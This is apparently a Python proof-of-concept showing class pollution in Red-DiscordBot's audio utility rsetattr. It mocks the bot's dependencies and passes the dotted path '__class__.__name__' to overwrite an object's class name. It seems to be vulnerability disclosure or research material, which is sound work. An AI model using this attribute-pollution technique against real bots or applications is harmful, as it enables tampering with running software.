# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: MiscellaneousUtilities.rsetattr
# Type: get-attr-set-attr

import sys
import types
import functools

# Mock discord and redbot dependencies to allow import
for mod_name in [
    'discord', 'discord.ext', 'discord.ext.commands',
    'redbot', 'redbot.core', 'redbot.core.bot', 'redbot.core.commands',
    'redbot.core.i18n', 'redbot.core.utils',
    'redbot.cogs', 'redbot.cogs.audio', 'redbot.cogs.audio.core',
    'redbot.cogs.audio.core.utilities',
    'aiohttp',
]:
    if mod_name not in sys.modules:
        m = types.ModuleType(mod_name)
        sys.modules[mod_name] = m

# Set up required mock attributes
sys.modules['redbot.core.i18n'].Translator = lambda *a: (lambda f: f)
sys.modules['redbot.core.commands'].Cog = type('Cog', (), {})

from redbot.cogs.audio.core.utilities.miscellaneous import MiscellaneousUtilities

class Target: pass
target = Target()

# Create a minimal instance to call rsetattr
mixin = MiscellaneousUtilities.__new__(MiscellaneousUtilities)

payload_value = "pwnd"
PAYLOAD = "__class__.__name__"

def run_poc():
  mixin.rsetattr(target, PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
